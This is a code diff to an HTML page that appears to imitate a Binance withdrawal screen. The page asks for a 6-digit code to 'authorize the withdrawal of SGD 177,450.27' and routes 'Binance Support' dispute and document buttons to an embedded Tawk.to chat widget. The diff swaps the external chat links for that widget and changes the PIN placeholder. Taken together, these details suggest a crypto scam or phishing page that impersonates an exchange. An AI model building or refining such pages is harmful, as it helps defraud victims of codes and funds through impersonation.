@@ -286,7 +286,7 @@
                     <p style="color: var(--term-text-muted);" class="small mb-4">Input the 6-digit security code to authorize the withdrawal of SGD 177,450.27.</p>
                     
                     <div class="mb-4">
-                        <input type="password" id="pinVerificationInput" class="form-control term-input-field text-center fs-2 tracking-widest mx-auto" style="max-width: 220px;" maxlength="6" placeholder="000000">
+                        <input type="password" id="pinVerificationInput" class="form-control term-input-field text-center fs-2 tracking-widest mx-auto" style="max-width: 220px;" maxlength="6" placeholder="●●●●●●">
                     </div>
                     <button class="btn-term-gold w-100 text-uppercase" onclick="executeTokenValidation()">Execute Signature Verification</button>
                 </div>
@@ -326,8 +326,8 @@
                     </div>
 
                     <p class="text-muted small mb-3">Need to dispute this decision or resubmit documents?</p>
-                    <a href="https://embed.tawk.to/6a1cd8c4e717081c2b47ed79/default4" target="_blank" class="btn-dispute">🔴 Open Dispute & Chat with Binance Support</a>
-                    <a href="https://embed.tawk.to/6a1cd8c4e717081c2b47ed79/default4" target="_blank" class="btn-message">📨 Resubmit Documents</a>
+                    <button class="btn-dispute" onclick="openLiveChat()">🔴 Open Dispute & Chat with Binance Support</button>
+                    <button class="btn-message" onclick="openLiveChat()">📨 Resubmit Documents</button>
                 </div>
 
                 <!-- STEP 6: SUCCESS COMPLETION -->
@@ -374,6 +374,17 @@
 
     <!-- JAVASCRIPT STATE CONTROLLER MATRIX -->
     <script>
+        // Tawk.to embed script
+        var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+        (function(){
+            var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+            s1.async=true;
+            s1.src='https://embed.tawk.to/6a1cd8c4e717081c2b47ed79/default4';
+            s1.charset='UTF-8';
+            s1.setAttribute('crossorigin','*');
+            s0.parentNode.insertBefore(s1,s0);
+        })();
+
         // State machine visibility toggle utility
         function switchState(hideElementId, showElementId) {
             const hideTarget = document.getElementById(hideElementId);
@@ -440,9 +451,11 @@
             switchState('layerSuccess', 'layerWallet');
         }
 
-        // Open live chat widget
+        // Open live chat widget - triggers Tawk.to chat
         function openLiveChat() {
-            window.open('https://embed.tawk.to/6a1cd8c4e717081c2b47ed79/default4', '_blank', 'width=400,height=600');
+            if (typeof Tawk_API !== 'undefined') {
+                Tawk_API.toggle();
+            }
         }
     </script>
 
